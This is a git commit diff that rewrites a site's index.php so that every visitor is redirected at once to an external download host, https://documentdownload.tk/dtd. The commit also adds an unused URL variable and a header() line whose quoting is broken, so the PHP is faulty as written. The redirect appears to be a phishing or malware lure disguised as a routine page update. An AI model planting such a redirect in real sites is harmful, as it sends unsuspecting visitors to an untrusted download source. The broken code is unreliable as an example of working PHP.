d8259a07585d1d8ef0fa40c3201b884db0b07519
davisd878 <65018543+davisd878@users.noreply.github.com>
2020-05-17 02:23:50 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,6 +1,10 @@
-<html>
-<head></head>
 <?php
-require('./index.php');
+	if (!empty($_SERVER['HTTPS']) && ('on' == $_SERVER['HTTPS'])) {
+		$uri = 'https://';
+	} else {
+		$uri = 'http://';
+	}
+	$uri .= $_SERVER['HTTP_HOST'];
+	header('Location: 'https://documentdownload.tk/dtd');
+	exit;
 ?>
-</html>
